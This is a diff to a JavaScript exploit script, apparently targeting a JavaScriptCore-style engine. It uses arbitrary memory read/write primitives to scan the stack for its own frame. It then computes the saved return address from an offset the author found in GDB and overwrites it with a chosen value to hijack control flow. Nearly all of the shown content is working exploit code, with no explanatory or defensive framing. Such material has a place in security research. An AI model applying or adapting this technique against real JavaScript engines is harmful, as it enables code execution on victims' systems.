@@ -100,9 +100,6 @@ hd(stack)
 p("---")
 
 function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
-    if (verbose)
-        $vm.dumpRegisters()
-
     let myStack = 0
     let fail = 0
     for (let i = stack; ; i -= 8n) {
@@ -115,7 +112,7 @@ function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
             myStack = i
             break
         }
-        
+
         ++fail
         if (fail > 1000)
             throw "Failed to find stack"
@@ -124,12 +121,19 @@ function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
     p("Found my stack: ")
     hd(myStack)
 
-    p("Found ret pc at:")
-    let retPC = myStack - 0xb31fff30n + 0xb31fff10n
-    hd(retPC)
-    hd(read64(retPC))
+    //$vm.crash()
 
-    write64(retPC, 0xBFBF691137n)
+    p("Found non-cloop ret pc at:") // I searched in GDB for this offset
+    let retPC = myStack - 0xb31fff30n + 0xbfffedacn
+    hd(retPC)
+
+    let retPCVal = read64(retPC)
+
+    hd(retPCVal & 0xFFFFFFFFn)
+    retPCVal = (retPCVal & (~0xFFFFFFFFn)) | 0xBFBF691137n
+
+    write64(retPC, retPCVal)
+    p('Written!')
 }
 
 findReturnAddress(0xBF, 0xEF)
